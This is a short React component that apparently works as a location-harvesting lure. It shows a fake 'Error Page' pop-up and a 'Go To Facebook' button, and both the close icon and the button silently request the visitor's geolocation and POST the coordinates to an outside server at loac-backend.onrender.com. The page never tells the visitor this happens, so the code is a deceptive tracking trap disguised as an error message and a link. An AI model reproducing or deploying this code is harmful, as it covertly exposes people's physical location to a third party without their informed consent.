import { FaArrowRightLong } from "react-icons/fa6";
import { RxCross1 } from "react-icons/rx";
import './App.css';
import { useState } from "react";

function App() {
  const [visible, setVisible] = useState(true);

  const handleClick = () => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;

          fetch('https://loac-backend.onrender.com/location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ latitude, longitude }),
          })
            .then(response => response.json())
            .then(data => {
              console.log('Response from server:', data);
            });
        },
        (error) => {
          console.error('Error getting location:', error);
        }
      );
    } else {
      console.log("success");
    }
  };

  const handleClose = () => {
    handleClick();
    setVisible(false);
  };

  return (
    <div className="h-lvh flex flex-col justify-center items-center space-y-4">
      {visible && (
        <div className="h-[200px] z-20 bg-slate-100 w-[200px] relative border flex flex-col items-center justify-center">
          <RxCross1
            onClick={handleClose}
            className="cursor-pointer absolute top-0 right-0 border text-2xl bg-black text-white"
          />
          <p className="flex items-center gap-2 p-3">
            Error Page <RxCross1 className="text-red-700" />
          </p>
        </div>
      )}

      <a href="https://www.facebook.com/share/p/1C2LdoEcBf" className=" absolute z-0">
        <button
          className="flex items-center border gap-2 px-3 font-thin"
          onClick={handleClick}
        >
          Go To Facebook <FaArrowRightLong />
        </button>
      </a>
    </div>
  );
}

export default App;